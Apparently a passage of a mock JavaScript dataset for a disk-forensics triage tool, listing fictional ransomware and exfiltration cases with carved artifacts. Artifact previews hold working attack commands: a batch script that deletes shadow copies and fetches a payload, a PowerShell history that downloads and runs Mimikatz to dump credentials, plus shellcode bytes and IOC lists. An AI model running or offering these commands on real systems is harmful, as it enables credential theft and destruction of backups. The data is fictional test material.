// Forensic mock dataset conforming to Section 8, 9, 10 of specifications
export const SAMPLE_CASES = {
  operation_nightfall: {
    id: "CASE-2026-NIGHTFALL",
    title: "Operation Nightfall - Ransomware Disk Dump",
    targetDevice: "Seagate Barracuda 2TB (SATA / Ext4 RAW Image)",
    investigator: "Det. H. Chen (Digital Forensics Unit)",
    incidentStart: "2026-09-24T14:00:00Z",
    incidentEnd: "2026-09-24T22:30:00Z",
    iocs: ["198.51.100.24", "exfil.darkmesh.onion", "blackcat_ransom.exe", "DROP TABLE", "bitcoin:bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", "shadowcopy delete", "mimikatz"],
    rawImageHash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    totalFragments: 36,
  },
  corporate_espionage: {
    id: "CASE-2026-ESPIONAGE",
    title: "Project Aegis - Corporate Exfiltration USB Dump",
    targetDevice: "SanDisk Ultra 128GB (exFAT Unallocated Space)",
    investigator: "Inv. Sarah Vance (CIRT Specialist)",
    incidentStart: "2026-09-22T08:00:00Z",
    incidentEnd: "2026-09-22T19:00:00Z",
    iocs: ["aegis_schematics_v3.dwg", "ftp.dropzone-7.net", "admin_vault_dump.kdbx", "curl -F", "7z a -pSecret"],
    rawImageHash: "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
    totalFragments: 24,
  }
};

export const MOCK_ARTIFACTS = [
  {
    id: "ART-1049",
    filename: "carved_sec_004F3A20_ransom_note.txt",
    type: "Document",
    classificationConfidence: 98.4,
    integrity: 95.0,
    corruption: "None (Clean UTF-8 text)",
    evidenceRelevance: 99.2,
    duplicate: false,
    priorityScore: 98.2,
    priorityTier: "Critical",
    reason: "Contains verified ransomware ransom demand with Onion link & BTC address during breach window.",
    metadata: {
      size: "2,048 bytes",
      sha256: "b4c29d10e8d0e514f7b231a44e55e347712399a9b0c2d3e4f5a6b7c8d9e0f1a2",
      md5: "7d2b8f1092a4bc88",
      ssdeep: "48:92a+fkP99xLq10vM394kLpQz82:9fkP9xLqvMpQz8",
      timestamps: {
        carved: "2026-09-25T10:14:22Z",
        inferredMtime: "2026-09-24T18:42:10Z",
        incidentWindowMatch: true,
      },
      sourceOffset: "0x004F3A20",
      sector: "Sector 5,192,160",
      mimeType: "text/plain; charset=utf-8",
    },
    classificationExplanation: {
      label: "Ransomware Note / Extortion Directive",
      confidence: 98.4,
      method: "ML/NLP (NER + Keyword Similarity on byte entropy 4.12)",
      signals: [
        "Matched high-entropy cryptocurrency address regex",
        "NLP detected threatening semantic intent and decryption payment instructions",
        "Rule-based UTF-8 byte stream validation"
      ],
      conflicts: "None. Header and content alignment 100%."
    },
    integrityAnalysis: {
      percentComplete: 95,
      corruptionType: "Trailing sector padding with null bytes (0x00)",
      missingData: "Last 48 bytes contains slack unallocated bytes, text body fully intact."
    },
    recoveryInfo: {
      sourceFragments: ["Frag-004F3A20 (Primary header 1024b)", "Frag-004F3E20 (Contiguous tail 1024b)"],
      carvingConfidence: 99.1,
      fragmentationStatus: "Contiguous (2 sectors)"
    },
    priorityExplanation: {
      relevanceContrib: 39.5, // out of 40
      integrityContrib: 28.5, // out of 30
      recencyContrib: 19.8,   // out of 20
      uniquenessContrib: 10.4, // out of 10
      total: 98.2
    },
    preview: {
      kind: "text",
      highlightedTokens: ["bitcoin:bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", "exfil.darkmesh.onion", "BlackCat Ransomware Group"],
      content: `!!! ATTENTION INVESTORS & SYSTEM ADMINISTRATORS !!!
All your virtual machines, hypervisors, and SQL clusters have been encrypted by BlackCat Ransomware Group.
We have exfiltrated 420GB of confidential source code, customer records, and banking credentials.
To purchase the private decryptor and avoid public leak on dark web:
1. Visit Tor portal: http://exfil.darkmesh.onion/auth?id=9928-NIGHTFALL
2. Deposit 15.5 BTC to: bitcoin:bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
Deadline: 72 hours from: 2026-09-24 18:00:00 UTC.
Do NOT reboot or modify encrypted partitions, or your keys will be destroyed.`
    },
    hexDump: `00000000  21 21 21 20 41 54 54 45  4e 54 49 4f 4e 20 49 4e  |!!! ATTENTION IN|
00000010  56 45 53 54 4f 52 53 20  26 20 53 59 53 54 45 4d  |VESTORS & SYSTEM|
00000020  20 41 44 4d 49 4e 49 53  54 52 41 54 4f 52 53 20  | ADMINISTRATORS |
00000030  21 21 21 0a 41 6c 6c 20  79 6f 75 72 20 76 69 72  |!!!.All your vir|`,
    relatedArtifacts: [
      { id: "ART-1052", name: "shadow_delete_script.bat", relation: "Cluster Member (Batch Executor)", score: 94.1 },
      { id: "ART-1088", name: "auth_audit_carve.db", relation: "Compromised Asset Log", score: 91.5 }
    ]
  },
  {
    id: "ART-1052",
    filename: "carved_sec_0068D100_vssadmin.bat",
    type: "System trace",
    classificationConfidence: 96.1,
    integrity: 100.0,
    corruption: "None",
    evidenceRelevance: 97.5,
    duplicate: false,
    priorityScore: 97.3,
    priorityTier: "Critical",
    reason: "Malicious anti-forensics script executing 'vssadmin delete shadows' and disabling recovery.",
    metadata: {
      size: "512 bytes",
      sha256: "c18f3a9e2d1400ba589410efb817c7e5a0139b81f9a2e6f212356c9d0124fe78",
      md5: "4a98d30e12ffc701",
      ssdeep: "12:vE921aKq+z9Pz:vm1aKqz",
      timestamps: {
        carved: "2026-09-25T10:14:24Z",
        inferredMtime: "2026-09-24T18:38:05Z",
        incidentWindowMatch: true,
      },
      sourceOffset: "0x0068D100",
      sector: "Sector 6,869,248",
      mimeType: "text/x-batch",
    },
    classificationExplanation: {
      label: "Anti-Forensics Batch Script",
      confidence: 96.1,
      method: "Rule-based regex syntax + ML process execution classification",
      signals: [
        "Rule Match: regex 'vssadmin.*delete shadows' triggered HIGH_SEV alert",
        "Rule Match: bcdedit recoveryenabled No",
        "ML Byte-Feature: high correlation with known payload stagers"
      ],
      conflicts: "None"
    },
    integrityAnalysis: {
      percentComplete: 100,
      corruptionType: "None (Full valid script)",
      missingData: "Complete single-sector script."
    },
    recoveryInfo: {
      sourceFragments: ["Frag-0068D100"],
      carvingConfidence: 99.8,
      fragmentationStatus: "Single Block"
    },
    priorityExplanation: {
      relevanceContrib: 39.0,
      integrityContrib: 30.0,
      recencyContrib: 19.5,
      uniquenessContrib: 8.8,
      total: 97.3
    },
    preview: {
      kind: "text",
      highlightedTokens: ["vssadmin delete shadows /all /quiet", "bcdedit /set {default} recoveryenabled No", "wbadmin delete catalog -quiet"],
      content: `@echo off
REM Anti-recovery wipe routine
vssadmin delete shadows /all /quiet
wbadmin delete catalog -quiet
wmic shadowcopy delete
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled No
net stop "VSS" /y
net stop "SQLSERVERAGENT" /y
powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://198.51.100.24/stage2.bin -OutFile C:\\Windows\\Temp\\srv.exe"`
    },
    hexDump: `00000000  40 65 63 68 6f 20 6f 66  66 0d 0a 52 45 4d 20 41  |@echo off..REM A|
00000010  6e 74 69 2d 72 65 63 6f  76 65 72 79 20 77 69 70  |nti-recovery wip|
00000020  65 20 72 6f 75 74 69 6e  65 0d 0a 76 73 73 61 64  |e routine..vssad|`,
    relatedArtifacts: [
      { id: "ART-1049", name: "carved_sec_004F3A20_ransom_note.txt", relation: "Related Incident Threat", score: 98.2 }
    ]
  },
  {
    id: "ART-1088",
    filename: "carved_sec_009B2000_auth_sessions.sqlite",
    type: "DB log",
    classificationConfidence: 94.7,
    integrity: 82.0,
    corruption: "Freelist truncated / Page 12 checksum mismatch",
    evidenceRelevance: 93.0,
    duplicate: false,
    priorityScore: 92.4,
    priorityTier: "Critical",
    reason: "SQLite database containing admin credentials and privilege escalation session from threat actor IP.",
    metadata: {
      size: "65,536 bytes (16 pages)",
      sha256: "e4a28f1105c317b9d3e81745aa6212b4e578491c120bfec211029177a8349bb1",
      md5: "8b234ca019918231",
      ssdeep: "384:p9F8k2e90+1qaZ...:pF8k2e90+1q",
      timestamps: {
        carved: "2026-09-25T10:14:28Z",
        inferredMtime: "2026-09-24T17:15:30Z",
        incidentWindowMatch: true,
      },
      sourceOffset: "0x009B2000",
      sector: "Sector 10,166,272",
      mimeType: "application/x-sqlite3",
    },
    classificationExplanation: {
      label: "SQLite 3 Relational Database",
      confidence: 94.7,
      method: "Rule-based SQLite header check (53 51 4c 69 74 65 20 66 6f 72 6d 61 74 20 33 00)",
      signals: [
        "Rule Match: Magic bytes 'SQLite format 3' exactly verified at offset 0",
        "Parser validated page size = 4096 bytes",
        "Schema parser extracted 4 tables: users, auth_tokens, audit_log, ssh_keys"
      ],
      conflicts: "Page 12 corrupted by overlaying NTFS MFT fragment."
    },
    integrityAnalysis: {
      percentComplete: 82,
      corruptionType: "B-Tree Leaf Page Corrupted at offset 0x0C000",
      missingData: "Pages 12-14 unreadable. Recovered 18 out of 22 session records from page 1-11."
    },
    recoveryInfo: {
      sourceFragments: ["Frag-009B2000 (Base DB)", "Frag-009B8000 (Leaf page carve)"],
      carvingConfidence: 94.2,
      fragmentationStatus: "Reassembled (2 non-contiguous extents)"
    },
    priorityExplanation: {
      relevanceContrib: 38.0,
      integrityContrib: 24.6,
      recencyContrib: 19.8,
      uniquenessContrib: 10.0,
      total: 92.4
    },
    preview: {
      kind: "db",
      tableName: "audit_log",
      columns: ["id", "timestamp", "user_principal", "src_ip", "action", "status"],
      rows: [
        ["1041", "2026-09-24 17:11:02", "svc_backup", "192.168.1.50", "LOGIN_SUCCESS", "OK"],
        ["1042", "2026-09-24 17:14:19", "admin_root", "198.51.100.24", "PRIV_ESCALATION", "FLAGGED"],
        ["1043", "2026-09-24 17:15:30", "admin_root", "198.51.100.24", "EXPORT_USER_HASHES", "CRITICAL"],
        ["1044", "2026-09-24 17:18:44", "system", "127.0.0.1", "VSS_TERMINATED", "WARN"]
      ]
    },
    hexDump: `00000000  53 51 4c 69 74 65 20 66  6f 72 6d 61 74 20 33 00  |SQLite format 3.|
00000010  10 00 01 01 00 40 20 20  00 00 00 04 00 00 00 04  |.....@  ........|
00000020  00 00 00 00 00 00 00 00  00 00 00 02 00 00 00 04  |................|`,
    relatedArtifacts: [
      { id: "ART-1052", name: "carved_sec_0068D100_vssadmin.bat", relation: "Source IP Match 198.51.100.24", score: 97.3 }
    ]
  },
  {
    id: "ART-1065",
    filename: "carved_sec_0078A000_exfil_c2.pcap",
    type: "System trace",
    classificationConfidence: 97.8,
    integrity: 88.0,
    corruption: "Packet truncated at frame #412",
    evidenceRelevance: 91.5,
    duplicate: false,
    priorityScore: 89.6,
    priorityTier: "High",
    reason: "Network packet capture fragment showing outbound TLS handshake to known Russian/bulletproof C2 host.",
    metadata: {
      size: "128,400 bytes",
      sha256: "47bce190281b379011afbc8170298a0d4b901a1c97a2161f32a4e27b99c01479",
      md5: "3c981b21ef0021a9",
      ssdeep: "768:98172k1a0...:98172k",
      timestamps: {
        carved: "2026-09-25T10:14:30Z",
        inferredMtime: "2026-09-24T17:45:12Z",
        incidentWindowMatch: true,
      },
      sourceOffset: "0x0078A000",
      sector: "Sector 7,905,280",
      mimeType: "application/vnd.tcpdump.pcap",
    },
    classificationExplanation: {
      label: "Libpcap Packet Capture",
      confidence: 97.8,
      method: "Rule-based Pcap Magic byte check (D4 C3 B2 A1)",
      signals: [
        "Rule Match: Libpcap endianness marker 0xa1b2c3d4 confirmed",
        "Parser decoded 412 Ethernet/IP/TCP frames",
        "C2 TLS SNI: darkmesh-proxy-node.ru extracted"
      ],
      conflicts: "None"
    },
    integrityAnalysis: {
      percentComplete: 88,
      corruptionType: "Truncated final packet frame (snaplen violation)",
      missingData: "Trailing 12% lost due to file carving boundary cut."
    },
    recoveryInfo: {
      sourceFragments: ["Frag-0078A000"],
      carvingConfidence: 95.0,
      fragmentationStatus: "Single Block"
    },
    priorityExplanation: {
      relevanceContrib: 36.6,
      integrityContrib: 26.4,
      recencyContrib: 18.2,
      uniquenessContrib: 8.4,
      total: 89.6
    },
    preview: {
      kind: "text",
      highlightedTokens: ["198.51.100.24:443", "TLSv1.3 Client Hello", "darkmesh-proxy-node.ru"],
      content: `[Frame 398] 17:44:59.102 192.168.1.50:49214 -> 198.51.100.24:443 [SYN] Seq=0 Win=64240
[Frame 399] 17:44:59.135 198.51.100.24:443 -> 192.168.1.50:49214 [SYN, ACK] Seq=0 Ack=1
[Frame 400] 17:44:59.136 192.168.1.50:49214 -> 198.51.100.24:443 [ACK] Seq=1 Ack=1
[Frame 401] 17:44:59.140 192.168.1.50:49214 -> 198.51.100.24:443 [TLSv1.3 Client Hello, SNI: darkmesh-proxy-node.ru]
[Frame 402] 17:45:00.012 192.168.1.50:49214 -> 198.51.100.24:443 [Application Data: 16384 bytes exfiltration chunk #1]
[Frame 412] 17:45:12.809 192.168.1.50:49214 -> 198.51.100.24:443 [STREAM CUT OFF - BUFFER END]`
    },
    hexDump: `00000000  d4 c3 b2 a1 02 00 04 00  00 00 00 00 00 00 00 00  |................|
00000010  ff ff 00 00 01 00 00 00  63 f3 d3 66 00 0e 07 00  |........c..f....|`,
    relatedArtifacts: [
      { id: "ART-1049", name: "carved_sec_004F3A20_ransom_note.txt", relation: "Matched IP 198.51.100.24", score: 98.2 }
    ]
  },
  {
    id: "ART-1077",
    filename: "carved_sec_003A1200_server_room_badge.jpg",
    type: "Photo",
    classificationConfidence: 91.2,
    integrity: 64.0,
    corruption: "Partial bottom scanlines missing / SOS marker shift",
    evidenceRelevance: 78.4,
    duplicate: false,
    priorityScore: 76.5,
    priorityTier: "High",
    reason: "Physical security badge photo recovered from phone backup cache near breach timeline.",
    metadata: {
      size: "412,180 bytes",
      sha256: "3189fa01c45e89d1720b0a88192a71f00b48a129ef991c01e231b4028919a710",
      md5: "5a1902bb91f0c29a",
      ssdeep: "1536:1290a+fk...:1290a",
      timestamps: {
        carved: "2026-09-25T10:14:32Z",
        inferredMtime: "2026-09-24T15:20:10Z",
        incidentWindowMatch: true,
      },
      sourceOffset: "0x003A1200",
      sector: "Sector 3,805,696",
      mimeType: "image/jpeg",
    },
    classificationExplanation: {
      label: "JPEG Image with EXIF Metadata",
      confidence: 91.2,
      method: "Rule-based SOI marker (FF D8 FF E0 / FF E1)",
      signals: [
        "Rule Match: Valid JPEG SOI (FF D8) and JFIF/EXIF APP1 segment",
        "Extracted camera model: Samsung Galaxy S24 Ultra",
        "GPS coordinates extracted from EXIF: 37.7749° N, 122.4194° W"
      ],
      conflicts: "Extension mismatch: original carving was raw dump chunk without extension."
    },
    integrityAnalysis: {
      percentComplete: 64,
      corruptionType: "Truncated bottom 36% of image; Huffman DC tables intact",
      missingData: "Missing EOI marker (FF D9). Lower image half rendered as gray glitch raster."
    },
    recoveryInfo: {
      sourceFragments: ["Frag-003A1200"],
      carvingConfidence: 89.0,
      fragmentationStatus: "Single Block (Premature EOF)"
    },
    priorityExplanation: {
      relevanceContrib: 31.2,
      integrityContrib: 19.2,
      recencyContrib: 17.5,
      uniquenessContrib: 8.6,
      total: 76.5
    },
    preview: {
      kind: "image",
      imageUrl: "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&w=600&q=80",
      caption: "Recovered ID badge scanline reconstruction (Upper quadrant intact, lower 36% corrupted)",
      exif: {
        camera: "Galaxy S24 Ultra",
        aperture: "f/1.7",
        iso: "250",
        gps: "37.7749° N, 122.4194° W (Building B Entrance)"
      }
    },
    hexDump: `00000000  ff d8 ff e1 0f fa 45 78  69 66 00 00 49 49 2a 00  |......Exif..II*.|
00000010  08 00 00 00 0c 00 0f 01  02 00 08 00 00 00 9e 00  |................|
00000020  00 00 10 01 02 00 12 00  00 00 a6 00 00 00 12 01  |................|`,
    relatedArtifacts: []
  },
  {
    id: "ART-1031",
    filename: "carved_sec_0011B000_q3_financial_audit.docx",
    type: "Document",
    classificationConfidence: 96.5,
    integrity: 92.0,
    corruption: "Minor ZIP central directory displacement",
    evidenceRelevance: 62.0,
    duplicate: false,
    priorityScore: 68.4,
    priorityTier: "Medium",
    reason: "Internal executive financial ledger fragment. High confidentiality, moderate incident relevance.",
    metadata: {
      size: "44,192 bytes",
      sha256: "1928374a5b6c7d8e9f0123456789abcdef0123456789abcdef0123456789abcd",
      md5: "62719a0082f1bba0",
      ssdeep: "768:98aB1v...:98aB",
      timestamps: {
        carved: "2026-09-25T10:14:18Z",
        inferredMtime: "2026-09-21T09:12:00Z",
        incidentWindowMatch: false,
      },
      sourceOffset: "0x0011B000",
      sector: "Sector 1,159,168",
      mimeType: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    },
    classificationExplanation: {
      label: "Microsoft Word (OOXML ZIP Archive)",
      confidence: 96.5,
      method: "Rule-based ZIP PK magic header (50 4B 03 04) + [Content_Types].xml detection",
      signals: [
        "Rule Match: ZIP Local File Header PK\\x03\\x04",
        "Rule Match: word/document.xml extracted successfully",
        "ML Byte-Feature: entropy 7.6 (typical compressed docx payload)"
      ],
      conflicts: "None"
    },
    integrityAnalysis: {
      percentComplete: 92,
      corruptionType: "Trailing ZIP End of Central Directory offset shifted by 16 bytes",
      missingData: "Unallocated bytes at end repaired by synthetic EOCD reconstruction."
    },
    recoveryInfo: {
      sourceFragments: ["Frag-0011B000", "Frag-0011C200"],
      carvingConfidence: 93.4,
      fragmentationStatus: "Reassembled (2 chunks)"
    },
    priorityExplanation: {
      relevanceContrib: 24.8,
      integrityContrib: 27.6,
      recencyContrib: 6.2,
      uniquenessContrib: 9.8,
      total: 68.4
    },
    preview: {
      kind: "text",
      highlightedTokens: ["CONFIDENTIAL", "Q3 Operating Reserves", "Board of Directors"],
      content: `CONFIDENTIAL - BOARD OF DIRECTORS ONLY
Summary of Q3 Fiscal Assets & Reserves
1. Total Cash Equivalents: $14,280,000 USD
2. Off-balance sheet liabilities: None
3. Digital asset reserve custody key stored at ColdVault Facility 4
[Document continued on next cluster...]`
    },
    hexDump: `00000000  50 4b 03 04 14 00 06 00  08 00 00 00 21 00 b8 4a  |PK..........!..J|
00000010  e8 81 5a 01 00 00 20 05  00 00 13 00 08 02 5b 43  |..Z... .......[C|
00000020  6f 6e 74 65 6e 74 5f 54  79 70 65 73 5d 2e 78 6d  |ontent_Types].xm|`,
    relatedArtifacts: []
  },
  {
    id: "ART-1032",
    filename: "carved_sec_0011B800_q3_financial_audit_DUP.docx",
    type: "Document",
    classificationConfidence: 96.5,
    integrity: 92.0,
    corruption: "Identical duplicate of ART-1031 in shadowcopy copy",
    evidenceRelevance: 62.0,
    duplicate: true,
    priorityScore: 32.1,
    priorityTier: "Low",
    reason: "Exact duplicate hash match to ART-1031 (Shadowcopy deduplicated).",
    metadata: {
      size: "44,192 bytes",
      sha256: "1928374a5b6c7d8e9f0123456789abcdef0123456789abcdef0123456789abcd",
      md5: "62719a0082f1bba0",
      ssdeep: "768:98aB1v...:98aB",
      timestamps: {
        carved: "2026-09-25T10:14:19Z",
        inferredMtime: "2026-09-21T09:12:00Z",
        incidentWindowMatch: false,
      },
      sourceOffset: "0x0011B800",
      sector: "Sector 1,161,216",
      mimeType: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    },
    classificationExplanation: {
      label: "Duplicate OOXML Document",
      confidence: 96.5,
      method: "Rule-based Cryptographic SHA-256 match",
      signals: ["Exact SHA-256 hash match against ART-1031"],
      conflicts: "None"
    },
    integrityAnalysis: {
      percentComplete: 92,
      corruptionType: "None (Identical to master)",
      missingData: "None"
    },
    recoveryInfo: {
      sourceFragments: ["Frag-0011B800"],
      carvingConfidence: 93.4,
      fragmentationStatus: "Duplicate Cluster"
    },
    priorityExplanation: {
      relevanceContrib: 15.0,
      integrityContrib: 15.0,
      recencyContrib: 2.1,
      uniquenessContrib: 0.0,
      total: 32.1
    },
    preview: {
      kind: "text",
      highlightedTokens: ["[DUPLICATE]"],
      content: `[DUPLICATE ARTIFACT OF ART-1031 - SHA-256 MATCH VERIFIED]`
    },
    hexDump: `00000000  50 4b 03 04 14 00 06 00  08 00 00 00 21 00 b8 4a  |PK..........!..J|`,
    relatedArtifacts: [
      { id: "ART-1031", name: "carved_sec_0011B000_q3_financial_audit.docx", relation: "Master Original Record", score: 68.4 }
    ]
  },
  {
    id: "ART-1014",
    filename: "carved_sec_0005C000_system_syslog.log",
    type: "System trace",
    classificationConfidence: 89.2,
    integrity: 98.0,
    corruption: "None",
    evidenceRelevance: 42.0,
    duplicate: false,
    priorityScore: 48.7,
    priorityTier: "Low",
    reason: "Standard system cron daemon activity log with no matching malicious indicators.",
    metadata: {
      size: "8,192 bytes",
      sha256: "9812401bc901a88192a71f00b48a129ef991c01e231b4028919a710111192837",
      md5: "1122334455667788",
      ssdeep: "192:78129ak...:7812",
      timestamps: {
        carved: "2026-09-25T10:14:10Z",
        inferredMtime: "2026-09-23T04:00:00Z",
        incidentWindowMatch: false,
      },
      sourceOffset: "0x0005C000",
      sector: "Sector 376,832",
      mimeType: "text/plain",
    },
    classificationExplanation: {
      label: "Unix System Log (syslog format)",
      confidence: 89.2,
      method: "Rule-based syslog grammar regex",
      signals: [
        "Matched RFC 3164 syslog header pattern",
        "NLP scan found 0 IOC keywords, negative threat score"
      ],
      conflicts: "None"
    },
    integrityAnalysis: {
      percentComplete: 98,
      corruptionType: "None",
      missingData: "None"
    },
    recoveryInfo: {
      sourceFragments: ["Frag-0005C000"],
      carvingConfidence: 98.0,
      fragmentationStatus: "Single Block"
    },
    priorityExplanation: {
      relevanceContrib: 16.8,
      integrityContrib: 29.4,
      recencyContrib: 2.5,
      uniquenessContrib: 0.0,
      total: 48.7
    },
    preview: {
      kind: "text",
      highlightedTokens: ["CRON[2819]", "anacron"],
      content: `Sep 23 04:00:01 srv-prod-01 CRON[2819]: (root) CMD (/usr/bin/updatedb)
Sep 23 04:05:01 srv-prod-01 CRON[2840]: (root) CMD (/etc/cron.daily/logrotate)
Sep 23 04:10:01 srv-prod-01 CRON[2899]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))`
    },
    hexDump: `00000000  53 65 70 20 32 33 20 30  34 3a 30 30 3a 30 31 20  |Sep 23 04:00:01 |
00000010  73 72 76 2d 70 72 6f 64  2d 30 31 20 43 52 4f 4e  |srv-prod-01 CRON|`,
    relatedArtifacts: []
  },
  {
    id: "ART-1095",
    filename: "carved_sec_00A1F000_corrupted_payload.bin",
    type: "System trace",
    classificationConfidence: 74.3,
    integrity: 35.0,
    corruption: "Heavy bitrot & missing header chunks",
    evidenceRelevance: 71.0,
    duplicate: false,
    priorityScore: 59.2,
    priorityTier: "Medium",
    reason: "Partial machine code fragment with high byte entropy (7.94), probable packed shellcode stager.",
    metadata: {
      size: "1,536 bytes",
      sha256: "87a6b5c4d3e2f109876543210fedcba9876543210fedcba9876543210fedcba9",
      md5: "deadbeef01234567",
      ssdeep: "24:9981a...:9981",
      timestamps: {
        carved: "2026-09-25T10:14:35Z",
        inferredMtime: "2026-09-24T18:22:00Z",
        incidentWindowMatch: true,
      },
      sourceOffset: "0x00A1F000",
      sector: "Sector 10,612,736",
      mimeType: "application/octet-stream",
    },
    classificationExplanation: {
      label: "High-Entropy Unknown Binary / Packed Shellcode",
      confidence: 74.3,
      method: "ML Gradient Boosting on Byte-Entropy Distribution",
      signals: [
        "Shannon Entropy = 7.94 bits/byte (High encryption or packing)",
        "Zero PE/ELF magic header bytes found (Ambiguous fragment)",
        "ML Model identified x86/x64 instruction sequence distribution"
      ],
      conflicts: "Unidentifiable by deterministic signature parsers. Pure ML prediction."
    },
    integrityAnalysis: {
      percentComplete: 35,
      corruptionType: "Missing executable headers and entrypoint table",
      missingData: "Upper 65% of payload was overwritten by NTFS MFT mirror."
    },
    recoveryInfo: {
      sourceFragments: ["Frag-00A1F000"],
      carvingConfidence: 62.0,
      fragmentationStatus: "Isolated Raw Sector"
    },
    priorityExplanation: {
      relevanceContrib: 28.4,
      integrityContrib: 10.5,
      recencyContrib: 15.3,
      uniquenessContrib: 5.0,
      total: 59.2
    },
    preview: {
      kind: "hex",
      highlightedTokens: ["0xFC 0xE8 (x86 Call/Pop shellcode prologue)"],
      content: `Hex & Disassembly Inspection:
00000000: fc e8 82 00 00 00 60 89  e5 31 c0 64 8b 50 30 8b  ......\`..1.d.P0.
00000010: 52 0c 8b 52 14 8b 72 28  0f b7 4a 26 31 ff ac 3c  R..R..r(..J&1..<
00000020: 61 7c 02 2c 20 c1 cf 0d  01 c7 e2 f2 52 57 8b 52  a|., .......RW.R`
    },
    hexDump: `00000000  fc e8 82 00 00 00 60 89  e5 31 c0 64 8b 50 30 8b  |......\`..1.d.P0.|
00000010  52 0c 8b 52 14 8b 72 28  0f b7 4a 26 31 ff ac 3c  |R..R..r(..J&1..<|
00000020  61 7c 02 2c 20 c1 cf 0d  01 c7 e2 f2 52 57 8b 52  |a|., .......RW.R|`,
    relatedArtifacts: [
      { id: "ART-1052", name: "carved_sec_0068D100_vssadmin.bat", relation: "Probable Staged Dropper", score: 97.3 }
    ]
  },
  {
    id: "ART-1060",
    filename: "carved_sec_00554000_executive_nda.pdf",
    type: "Document",
    classificationConfidence: 99.1,
    integrity: 79.0,
    corruption: "Missing xref table and EOF marker (%EOF truncated)",
    evidenceRelevance: 75.0,
    duplicate: false,
    priorityScore: 78.8,
    priorityTier: "High",
    reason: "Leaked executive acquisition NDA document. PDF xref table corrupted by carving slice, stream readable.",
    metadata: {
      size: "82,410 bytes",
      sha256: "7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b",
      md5: "39a01828bf019283",
      ssdeep: "1536:81298a0...:8129",
      timestamps: {
        carved: "2026-09-25T10:14:26Z",
        inferredMtime: "2026-09-24T16:10:00Z",
        incidentWindowMatch: true,
      },
      sourceOffset: "0x00554000",
      sector: "Sector 5,586,944",
      mimeType: "application/pdf",
    },
    classificationExplanation: {
      label: "Adobe Portable Document Format (PDF 1.7)",
      confidence: 99.1,
      method: "Rule-based header signature (%PDF-1.7)",
      signals: [
        "Rule Match: Magic bytes '%PDF-1.7' at offset 0",
        "Linearization dictionary detected",
        "Stream parser extracted 3 textual objects"
      ],
      conflicts: "None"
    },
    integrityAnalysis: {
      percentComplete: 79,
      corruptionType: "Truncated trailer and cross-reference table (%%EOF missing)",
      missingData: "Objects 4 to 6 missing due to non-contiguous allocation."
    },
    recoveryInfo: {
      sourceFragments: ["Frag-00554000"],
      carvingConfidence: 91.0,
      fragmentationStatus: "Single Chunk (Truncated Tail)"
    },
    priorityExplanation: {
      relevanceContrib: 30.0,
      integrityContrib: 23.7,
      recencyContrib: 16.5,
      uniquenessContrib: 8.6,
      total: 78.8
    },
    preview: {
      kind: "text",
      highlightedTokens: ["MUTUAL NON-DISCLOSURE AGREEMENT", "Project Titan", "STRICTLY CONFIDENTIAL"],
      content: `MUTUAL NON-DISCLOSURE AGREEMENT (NDA)
BETWEEN: Apex Technologies Corp. AND CyberDyne Systems LLC
RE: Project Titan - Sovereign Cryptographic Hardware Architecture
1. Confidential Information shall not be disclosed to any third party...
[Page 1 intact, Page 2 stream interrupted by carving boundary]`
    },
    hexDump: `00000000  25 50 44 46 2d 31 2e 37  0a 25 c7 ec 8f a2 0a 34  |%PDF-1.7.%.....4|
00000010  20 30 20 6f 62 6a 0a 3c  3c 2f 4c 69 6e 65 61 72  | 0 obj.<</Linear|`,
    relatedArtifacts: []
  },
  {
    id: "ART-1072",
    filename: "carved_sec_0081C400_powershell_history.txt",
    type: "System trace",
    classificationConfidence: 95.8,
    integrity: 100.0,
    corruption: "None",
    evidenceRelevance: 96.0,
    duplicate: false,
    priorityScore: 95.4,
    priorityTier: "Critical",
    reason: "PowerShell console history containing lateral movement, mimikatz invocation, and shadow copy purge commands.",
    metadata: {
      size: "4,096 bytes",
      sha256: "554433221100ffeeddccbbaa99887766554433221100ffeeddccbbaa99887766",
      md5: "9812401bc901a881",
      ssdeep: "96:9120aK...:912",
      timestamps: {
        carved: "2026-09-25T10:14:31Z",
        inferredMtime: "2026-09-24T18:15:22Z",
        incidentWindowMatch: true,
      },
      sourceOffset: "0x0081C400",
      sector: "Sector 8,504,320",
      mimeType: "text/plain",
    },
    classificationExplanation: {
      label: "PowerShell PSReadLine History",
      confidence: 95.8,
      method: "Rule-based grammar & keyword parser",
      signals: [
        "Rule Match: Found 'Invoke-Mimikatz'",
        "Rule Match: Net user administrator /domain query",
        "Rule Match: Invoke-WebRequest exfiltration parameter"
      ],
      conflicts: "None"
    },
    integrityAnalysis: {
      percentComplete: 100,
      corruptionType: "None",
      missingData: "Complete 148 command lines recovered."
    },
    recoveryInfo: {
      sourceFragments: ["Frag-0081C400"],
      carvingConfidence: 99.5,
      fragmentationStatus: "Single Block"
    },
    priorityExplanation: {
      relevanceContrib: 38.4,
      integrityContrib: 30.0,
      recencyContrib: 18.5,
      uniquenessContrib: 8.5,
      total: 95.4
    },
    preview: {
      kind: "text",
      highlightedTokens: ["Invoke-Mimikatz", "sekurlsa::logonpasswords", "198.51.100.24", "Test-NetConnection"],
      content: `whoami /priv
net user /domain
nltest /dclist:CORP
IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.24/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
Test-NetConnection -ComputerName 10.0.4.12 -Port 445
copy C:\\Windows\\Temp\\payload.dll \\\\10.0.4.12\\C$\\Windows\\System32\\srv.dll`
    },
    hexDump: `00000000  77 68 6f 61 6d 69 20 2f  70 72 69 76 0d 0a 6e 65  |whoami /priv..ne|
00000010  74 20 75 73 65 72 20 2f  64 6f 6d 61 69 6e 0d 0a  |t user /domain..|`,
